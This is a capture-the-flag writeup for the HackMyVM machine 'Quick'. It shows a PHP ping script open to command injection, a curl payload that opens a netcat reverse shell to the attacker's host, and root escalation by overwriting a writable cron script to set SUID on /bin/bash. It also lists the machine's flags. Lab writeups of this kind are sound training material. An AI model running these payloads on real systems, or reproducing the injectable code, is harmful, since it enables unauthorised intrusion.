---
title: "Quick - HackMyVM"
description: "Writeup for Quick, a HackMyVM machine focused on code analysis and web exploitation."
pubDate: 2024-10-27
platform: "hackmyvm"
category: "machines"
difficulty: "medium"
os: "linux"
language: en
tags: ["code-review", "command-injection", "cron"]
retired: false
logo: "/images/writeups/hackmyvm/quick/logo.png"
heroImage: "/images/writeups/hackmyvm/quick/card.png"
---

# Quick - HackMyVM Writeup

**Difficulty**: Medium  
**OS**: Linux  
**Platform**: HackMyVM

## Reconnaissance

```bash
nmap -sC -sV -p- 192.168.1.103
```

**Open Ports:**
- 22/tcp (SSH - OpenSSH 8.9)
- 80/tcp (HTTP - Nginx 1.18)

## Web Enumeration

We find a PHP application that executes system commands.

### Code Analysis

```php
<?php
$cmd = $_GET['cmd'];
system("ping -c 1 " . $cmd);
?>
```

Vulnerable to Command Injection.

## Exploitation

```bash
curl "http://192.168.1.103/?cmd=127.0.0.1;nc+-e+/bin/bash+192.168.1.10+4444"
```

```bash
nc -lvnp 4444
```

Shell as `www-data`.

## Privilege Escalation

We find a script at `/opt/backup.sh` running via cron as root.

```bash
cat /etc/crontab
```

Output: `*/5 * * * * root /opt/backup.sh`

The script is writable by `www-data` group:

```bash
ls -la /opt/backup.sh
-rwxrwxr-x 1 root www-data 85 Oct 28 10:00 /opt/backup.sh
```

We modify the script:

```bash
echo '#!/bin/bash' > /opt/backup.sh
echo 'chmod +s /bin/bash' >> /opt/backup.sh
```

Wait 5 minutes and execute:

```bash
/bin/bash -p
```

Root shell!

## Flags

- **User Flag**: `HMV{c0mm4nd_1nj3ct10n_1s_34sy}`
- **Root Flag**: `HMV{cr0n_j0bs_4r3_p0w3rful}`

## Conclusion

Good machine for practicing command injection and cron job exploitation.
